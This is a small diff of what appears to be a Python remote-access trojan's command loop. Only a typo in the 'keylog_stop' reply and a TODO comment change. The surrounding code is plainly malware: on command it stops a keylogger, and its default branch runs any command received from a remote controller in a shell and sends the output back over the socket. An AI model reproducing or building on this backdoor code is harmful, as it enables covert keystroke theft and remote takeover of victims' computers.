@@ -51,9 +51,8 @@ def execute_shell():
 
         elif command[:11] == 'keylog_stop':
             keylog.self_destruct()
-            client.send(b'keylog stopeed')
+            client.send(b'keylog stoped')
             
-        #TODO add elif('s) for keylogger (step 6)
         else:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
             client.send(op.stdout.read() + op.stderr.read())
